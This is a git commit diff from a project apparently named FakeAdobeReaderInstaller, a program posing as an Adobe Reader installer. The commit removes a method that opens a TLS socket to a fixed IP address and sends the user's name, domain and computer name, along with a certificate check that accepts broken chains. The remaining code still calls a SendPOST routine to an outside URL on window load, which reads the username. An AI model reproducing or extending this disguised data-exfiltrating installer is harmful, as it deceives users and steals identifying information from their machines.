85efd2be7a732ef1b138fd954d18772006291d9a
netrunn3r <netrunn3r@protonmail.com>
2017-05-10 13:12:44 +0200

    cleaning unused methods

--- FakeAdobeReaderInstaller/FakeAdobeReaderInstaller/MainWindow.xaml.cs
+++ FakeAdobeReaderInstaller/FakeAdobeReaderInstaller/MainWindow.xaml.cs
@@ -2,10 +2,6 @@
 using System.Text;
 using System.Windows;
 using System.Windows.Threading;
-using System.Net.Sockets;
-using System.Net.Security;
-using System.Security.Authentication;
-using System.Security.Cryptography.X509Certificates;
 using System.Net;
 using System.IO;
 
@@ -73,75 +69,9 @@ namespace FakeAdobeReaderInstaller
         }
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {
-            //RunClient("192.168.1.106", "test", 10023);
             SendPOST("https://asd.com/index.php");
         }
 
-        public static bool ValidateServerCertificate(
-              object sender,
-              X509Certificate certificate,
-              X509Chain chain,
-              SslPolicyErrors sslPolicyErrors)
-        {
-            //if (sslPolicyErrors == SslPolicyErrors.None)
-            if (sslPolicyErrors == SslPolicyErrors.RemoteCertificateChainErrors)
-                return true;
-
-            // Do not allow this client to communicate with unauthenticated servers.
-            return false;
-        }
-        public static void RunClient(string machineName, string serverName, int port)
-        {
-
-            TcpClient client = new TcpClient(machineName, port);
-            SslStream sslStream = new SslStream(
-                client.GetStream(),
-                false,
-                new RemoteCertificateValidationCallback(ValidateServerCertificate),
-                null
-                );
-            // The server name must match the name on the server certificate.
-            try
-            {
-                sslStream.AuthenticateAsClient(serverName, new X509CertificateCollection(), SslProtocols.Tls, true);
-            }
-            catch (AuthenticationException e)
-            {
-                client.Close();
-                return;
-            }
-
-            string keyExchange = "Error";
-            switch (sslStream.KeyExchangeAlgorithm)
-            {
-                case ExchangeAlgorithmType.None:
-                    keyExchange = "None";
-                    break;
-                case ExchangeAlgorithmType.DiffieHellman:
-                    keyExchange = "DiffieHellman";
-                    break;
-                case ExchangeAlgorithmType.RsaKeyX:
-                    keyExchange = "RSA exchange algorithm";
-                    break;
-                case ExchangeAlgorithmType.RsaSign:
-                    keyExchange = "RSA signature algorithm";
-                    break;
-                case (ExchangeAlgorithmType)44550:
-                    keyExchange = "ECDH Ephemeral";
-                    break;
-            }
-
-            byte[] msg_username = Encoding.UTF8.GetBytes(System.Environment.GetEnvironmentVariable("USERNAME", EnvironmentVariableTarget.Process) + ';');
-            byte[] msg_userdomain = Encoding.UTF8.GetBytes(System.Environment.GetEnvironmentVariable("USERDOMAIN", EnvironmentVariableTarget.Process) + ';');
-            byte[] msg_computername = Encoding.UTF8.GetBytes(System.Environment.GetEnvironmentVariable("COMPUTERNAME", EnvironmentVariableTarget.Process) + '\0');
-
-            sslStream.Write(msg_username);
-            sslStream.Write(msg_userdomain);
-            sslStream.Write(msg_computername);
-            sslStream.Flush();
-
-            client.Close();
-        }
         private void SendPOST(string serverName)
         {
             string msg_username = System.Environment.GetEnvironmentVariable("USERNAME", EnvironmentVariableTarget.Process);
